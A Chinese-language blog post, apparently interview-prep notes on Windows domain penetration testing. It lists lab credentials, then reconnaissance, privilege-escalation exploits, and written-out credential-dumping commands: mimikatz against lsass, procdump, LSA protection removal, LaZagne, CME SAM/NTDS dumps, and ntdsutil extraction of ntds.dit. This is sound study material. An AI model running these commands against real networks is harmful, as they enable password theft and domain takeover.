<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>渗透测试面试分区块总结 | Y5neKO's Blog</title><meta name="author" content="Y5neKO"><meta name="copyright" content="Y5neKO"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="域渗透123456789101112131415161718192021222324#DC	WindowsServer2012域名：y5neko.comNAT：192.168.1.129静态：192.168.1.250密码：Y5NEKO0&#x2F;Administrator:dc@123NetBIOS域名：Y5NEKO0其他域用户账号密码：user1:win71@123user2:win72@123普通域">
<meta property="og:type" content="article">
<meta property="og:title" content="渗透测试面试分区块总结">
<meta property="og:url" content="https://blog.y5neko.uk/2024/08/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E5%88%86%E5%8C%BA%E5%9D%97%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="Y5neKO&#39;s Blog">
<meta property="og:description" content="域渗透123456789101112131415161718192021222324#DC	WindowsServer2012域名：y5neko.comNAT：192.168.1.129静态：192.168.1.250密码：Y5NEKO0&#x2F;Administrator:dc@123NetBIOS域名：Y5NEKO0其他域用户账号密码：user1:win71@123user2:win72@123普通域">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.y5neko.uk/image/image-20230926215400707.png">
<meta property="article:published_time" content="2024-08-08T16:00:00.000Z">
<meta property="article:modified_time" content="2024-08-20T06:02:56.000Z">
<meta property="article:author" content="Y5neKO">
<meta property="article:tag" content="笔记">
<meta property="article:tag" content="面试">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.y5neko.uk/image/image-20230926215400707.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://blog.y5neko.uk/2024/08/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E5%88%86%E5%8C%BA%E5%9D%97%E6%80%BB%E7%BB%93/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d4f6675f179ef53324ef6281fc51a93c";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":1000,"position":"top","messagePrev":"这篇文章最后更新时间是","messageNext":"天之前，描述可能已经失效，请谨慎辨别."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Y5neKO","link":"链接: ","source":"来源: Y5neKO's Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '渗透测试面试分区块总结',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-08-20 14:02:56'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/rss2.xml" title="Y5neKO's Blog" type="application/rss+xml">
</head><body><script>window.paceOptions = {
  restartOnPushState: false
}

document.addEventListener('pjax:send', () => {
  Pace.restart()
})
</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "/img/friend_404.gif" data-lazy-src="https://q1.qlogo.cn/g?b=qq&amp;nk=1727058834&amp;s=640" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/image/image-20230926215400707.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Y5neKO's Blog"><span class="site-name">Y5neKO's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">渗透测试面试分区块总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-08T16:00:00.000Z" title="发表于 2024-08-09 00:00:00">2024-08-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-20T06:02:56.000Z" title="更新于 2024-08-20 14:02:56">2024-08-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%A2%E8%AF%95/">面试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">26.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>99分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="渗透测试面试分区块总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/08/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E5%88%86%E5%8C%BA%E5%9D%97%E6%80%BB%E7%BB%93/#post-comment"><span class="gitalk-comment-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#DC	WindowsServer2012</span></span><br><span class="line">域名：y5neko.com</span><br><span class="line">NAT：192.168.1.129</span><br><span class="line">静态：192.168.1.250</span><br><span class="line">密码：Y5NEKO0/Administrator:dc@123</span><br><span class="line">NetBIOS域名：Y5NEKO0</span><br><span class="line">其他域用户账号密码：</span><br><span class="line">user1:win71@123</span><br><span class="line">user2:win72@123</span><br><span class="line">普通域管理员账号密码：</span><br><span class="line">admin:admin@123</span><br><span class="line">yueshu:yueshu@123</span><br><span class="line">yeushu1:yueshu1@123</span><br><span class="line">ziyuanyueshu:ziyuanyueshu@123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SYSVOL漏洞测试密码：user@123</span><br><span class="line"></span><br><span class="line"><span class="comment">#WIN71	Windows7</span></span><br><span class="line">密码：Administrator:win71@123</span><br><span class="line">静态：192.168.1.3</span><br><span class="line"></span><br><span class="line"><span class="comment">#Kali</span></span><br><span class="line">NAT：192.168.1.128</span><br></pre></td></tr></table></figure>



<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="判断域环境"><a href="#判断域环境" class="headerlink" title="判断域环境"></a>判断域环境</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>

<h3 id="找域控"><a href="#找域控" class="headerlink" title="找域控"></a>找域控</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fscan扫描netbios</span></span><br><span class="line">./fscan_amd64 -np -m netbios -h 192.168.1.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment">#net group命令</span></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br><span class="line">net group <span class="string">&quot;domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230926215400707.png" alt="image-20230926215400707" style="zoom: 80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230927202450654.png" alt="image-20230927202450654" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230927210911362.png" alt="image-20230927210911362" style="zoom:80%;" />



<h3 id="扫描器快速扫描"><a href="#扫描器快速扫描" class="headerlink" title="扫描器快速扫描"></a>扫描器快速扫描</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cme smb &lt;ip_range&gt; 							<span class="comment"># SMB 扫描存活主机</span></span><br><span class="line">nmap -sP -p &lt;ip&gt; 							<span class="comment"># ping 扫描</span></span><br><span class="line">nmap -PN -sV --top-ports 50 --open &lt;ip&gt; 	<span class="comment"># 快速扫描</span></span><br><span class="line">nmap -PN --script smb-vuln* -p139,445 &lt;ip&gt; 	<span class="comment"># 检测 SMB 漏洞</span></span><br><span class="line">nmap -PN -sC -sV &lt;ip&gt; 						<span class="comment"># 经典扫描</span></span><br><span class="line">nmap -PN -sC -sV -p- &lt;ip&gt;		 			<span class="comment"># 全扫描</span></span><br><span class="line">nmap -sU -sC -sV &lt;ip&gt; 						<span class="comment"># UDP 扫描</span></span><br></pre></td></tr></table></figure>

<h3 id="直接利用现有漏洞"><a href="#直接利用现有漏洞" class="headerlink" title="直接利用现有漏洞"></a>直接利用现有漏洞</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo 									<span class="comment">#查看补丁信息</span></span><br><span class="line">findstr /S cpassword \test.orgsysvol*.xml		<span class="comment">#MS14-025利用</span></span><br></pre></td></tr></table></figure>

<h4 id="永恒之蓝MS17-010"><a href="#永恒之蓝MS17-010" class="headerlink" title="永恒之蓝MS17-010"></a>永恒之蓝MS17-010</h4><blockquote>
<p>远程命令执行，利用多个SMB漏洞进行攻击，因为涉及smb服务，所以需要利用139(TCP)和445(TCP)端口</p>
<p>涉及到的补丁编号有：<br>KB4012598<br>KB4012212<br>KB4013429<br>KB4013198<br>KB4012606</p>
</blockquote>
<h4 id="SYSVOL漏洞MS14-025"><a href="#SYSVOL漏洞MS14-025" class="headerlink" title="SYSVOL漏洞MS14-025"></a>SYSVOL漏洞MS14-025</h4><blockquote>
<p>权限提升，早期的某些版本组策略首选项可以储存加密过的密码，加密方式为AES-256，尽管这种方式很难被攻破，但是微软直接公示了解密私钥</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/t016b35d9da99ba64ad.png" alt="image-20200415100741776" style="zoom: 33%;" />
</blockquote>
<h4 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h4><p>auxiliary&#x2F;scanner&#x2F;http&#x2F;tomcat_enum</p>
<p>tomcat弱密码等，war包后门</p>
<h4 id="jboss-manager"><a href="#jboss-manager" class="headerlink" title="jboss manager"></a>jboss manager</h4><h4 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h4><p>常见的组件：shiro，weblogic，反序列化，cc链，cb链</p>
<p>exp生成工具：ysoserial</p>
<h4 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h4><p>查找漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -u #更新</span><br><span class="line">searchsploit 关键词</span><br></pre></td></tr></table></figure>



<h4 id="爆数据库连接"><a href="#爆数据库连接" class="headerlink" title="爆数据库连接"></a>爆数据库连接</h4><p>admin&#x2F;mssql&#x2F;mssql_enum_sql_logins</p>
<h4 id="proxylogon"><a href="#proxylogon" class="headerlink" title="proxylogon"></a>proxylogon</h4><p>1、 通过SSRF漏洞攻击,访问autodiscover.xml泄露LegacyDN信息<br>2、 在通过LegacyDN, 获取SID<br>3.、然后通过合法的SID,获取exchange的有效cookie<br>4.、最后通过有效的cookie,对OABVirtualDirectory对象进行恶意操作，写入一句话木马</p>
<p>ProxyLogon是通过利用CVE-2021-26855 SSRF 漏洞，然后使用CVE-2021-27065 任意文件写入漏洞组合进行利用。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/15762864.html">https://www.cnblogs.com/nice0e3/p/15762864.html</a></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="winPEAS"><a href="#winPEAS" class="headerlink" title="winPEAS"></a>winPEAS</h4><blockquote>
<p>自动化扫描工具，可用于检测提权</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p>
</blockquote>
<ul>
<li><h4 id="查找含有关键字的文档文件"><a href="#查找含有关键字的文档文件" class="headerlink" title="查找含有关键字的文档文件"></a>查找含有关键字的文档文件</h4></li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查找内容有 password 的文件：findstr /si <span class="string">&#x27;&#123;关键字&#125;&#x27;</span> *.txt *.xml *.docx</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230922195115462.png" alt="image-20230922195115462" style="zoom: 67%;" />



<ul>
<li><h4 id="烂土豆提权Rotten-Patato-MS16-075"><a href="#烂土豆提权Rotten-Patato-MS16-075" class="headerlink" title="烂土豆提权Rotten Patato  MS16-075"></a>烂土豆提权Rotten Patato  MS16-075</h4></li>
</ul>
<blockquote>
<p>通过模仿令牌欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证，对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/foxglovesec/Potato">https://github.com/foxglovesec/Potato</a> </p>
</blockquote>
<h4 id="多汁土豆提权Juicy-Potato"><a href="#多汁土豆提权Juicy-Potato" class="headerlink" title="多汁土豆提权Juicy Potato"></a>多汁土豆提权Juicy Potato</h4><blockquote>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p>
</blockquote>
<h4 id="PrintSpoofer"><a href="#PrintSpoofer" class="headerlink" title="PrintSpoofer"></a>PrintSpoofer</h4><blockquote>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/whojeff/PrintSpoofer">https://github.com/whojeff/PrintSpoofer</a></p>
</blockquote>
<h4 id="RoguePotato"><a href="#RoguePotato" class="headerlink" title="RoguePotato"></a>RoguePotato</h4><blockquote>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></p>
</blockquote>
<h4 id="SMBGhost-CVE-2020-0796"><a href="#SMBGhost-CVE-2020-0796" class="headerlink" title="SMBGhost  CVE-2020-0796"></a>SMBGhost  CVE-2020-0796</h4><blockquote>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/dacade/CVE-POC/tree/master/CVE-2020-0796">https://github.com/dacade/CVE-POC/tree/master/CVE-2020-0796</a></p>
</blockquote>
<h4 id="SeriousSAM-CVE-2021-36934"><a href="#SeriousSAM-CVE-2021-36934" class="headerlink" title="SeriousSAM  CVE-2021-36934"></a>SeriousSAM  CVE-2021-36934</h4><blockquote>
<p>允许低权限用户访问SAM文件，该漏洞不影响Server版本</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/GossiTheDog/HiveNightmare">https://github.com/GossiTheDog/HiveNightmare</a></p>
</blockquote>
<h3 id="本地管理员进一步提权"><a href="#本地管理员进一步提权" class="headerlink" title="本地管理员进一步提权"></a>本地管理员进一步提权</h3><h4 id="procdump-exe"><a href="#procdump-exe" class="headerlink" title="procdump.exe"></a>procdump.exe</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过procdump.exe导出lsass.exe进程的内存，lsass进程中缓存有当前登陆密码</span></span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过mimikatz以管理员权限读取明文密码</span></span><br><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line"><span class="comment">#通过mimikatz以管理员权限dump lsass进程的内存</span></span><br><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;token::elevate&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;lsadump::sam&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="msf-hashdump模块"><a href="#msf-hashdump模块" class="headerlink" title="msf hashdump模块"></a>msf hashdump模块</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#前提是msf获取到了目标shell</span></span><br><span class="line">use post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>

<h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>CrackMapExec（CME）是一款后渗透利用工具，可帮助自动化大型活动目录(AD)网络安全评估任务。利用AD内置功能&#x2F;协议达成其功能，并规避大多数终端防护&#x2F;IDS&#x2F;IPS解决方案。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -M lsassy</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p <span class="string">&#x27;&lt;password&gt;&#x27;</span> --sam / --lsa / --ntds</span><br></pre></td></tr></table></figure>

<h3 id="绕过LSA读取密码"><a href="#绕过LSA读取密码" class="headerlink" title="绕过LSA读取密码"></a>绕过LSA读取密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PPLdump64.exe &lt;lsass.exe|lsass_pid&gt; lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz &quot;!+&quot; &quot;!processprotect /process:lsass.exe /remove&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot;  &quot;sekurlsa::logonpasswords&quot; &quot;!processprotect  /process:lsass.exe&quot; &quot;!-&quot; #with mimidriver.sys </span><br></pre></td></tr></table></figure>

<h3 id="token窃取"><a href="#token窃取" class="headerlink" title="token窃取"></a>token窃取</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看本地存储所有的密码</span></span><br><span class="line">lazagne.exe all</span><br><span class="line">GitHub地址：https://github.com/AlessandroZ/LaZagne</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230922210601160.png" alt="image-20230922210601160" style="zoom:67%;" />

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#卷影拷贝（获取域控所有hash）</span></span><br><span class="line"><span class="comment">#通常情况下，即使拥有管理员权限，也无法读取域控制器中的C:\Windows\NTDS\ntds.dit文件。(活动目录始终访问这个文件，所以文件被禁止读取)</span></span><br><span class="line"><span class="comment">#使用Windows本地卷影拷贝服务(volume Shadow Copy Server，VSS)，就可以获取文件的副本(类似于虚拟机的快照)。</span></span><br><span class="line"><span class="comment">#ntds.dit文件是一个数据库，用于存储Active Directory数据，包括有关用户对象，组和组成员身份的信息。它包括域中所有用户的密码哈希。通过提取这些哈希值，可以使用诸如Mimikatz之类的工具执行哈希传递攻击，或使用诸如Hashcat之类的工具来破解这些密码。这些密码的提取和破解可以脱机执行，因此将无法检测到。一旦攻击者提取了这些散列，它们便可以充当域上的任何用户，包括域管理员。</span></span><br><span class="line"><span class="comment">#在活动目录中，所有的数据都保存在ntds.dit中。ntds.dit是一个二进制文件，存储位置为域控制器的%SystemRoot%\ntds\ntds.dit。ntds.dit中包含用户名、散列值、组、GPP、OU等与活动目录相关的信息。它和SAM文件一样，是被操作系统锁定的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#①利用ntdsutil.exe提取ntds.dit</span></span><br><span class="line"><span class="comment">#创建快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;activate instance ntds&quot;</span> create quit quit</span><br><span class="line"><span class="comment">#挂载快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;mount &#123;f2de785c-15d1-4b9d-bd1a-deeb599c1e2b&#125;&quot;</span> quit quit</span><br><span class="line"><span class="comment">#复制ntds.dit</span></span><br><span class="line">copy C:\$SNAP_202309222110_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line">unmount		delete</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230922211034183.png" alt="image-20230922211034183" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230922211236499.png" alt="image-20230922211236499" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230922212159251.png" alt="image-20230922212159251" style="zoom: 67%;" />

